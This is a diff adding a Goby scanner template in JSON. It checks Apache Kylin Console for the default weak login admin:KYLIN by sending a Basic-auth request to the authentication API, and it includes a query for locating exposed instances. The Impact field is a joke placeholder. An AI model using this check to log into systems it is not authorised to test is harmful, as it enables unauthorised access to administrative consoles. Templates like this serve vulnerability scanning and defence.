@@ -1,0 +1,56 @@
+{
+      "Name": "Apache Kylin Console 控制台弱口令",
+      "Level": "2",
+      "Tags": [
+            "弱口令"
+      ],
+      "GobyQuery": "app=\"APACHE-kylin\"",
+      "Description": "Apache Kylin Console 控制台存在默认弱口令 admin：KYLIN，可被登录控制台进一步利用其他漏洞",
+      "Product": "Apache Kylin",
+      "Homepage": "http://kylin.apache.org/",
+      "Author": "PeiQi",
+      "Impact": "<p><span style=\"color: rgb(65, 140, 175);\">咩咩咩🐏</span></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/kylin/api/user/authentication",
+                        "follow_redirect": true,
+                        "header": {
+                              "Authorization": "Basic YWRtaW46S1lMSU4=",
+                              "Cookie": "project=null"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "!=",
+                                    "value": "401",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-01-24 13:23:42",
+      "GobyVersion": "1.8.237"
+}
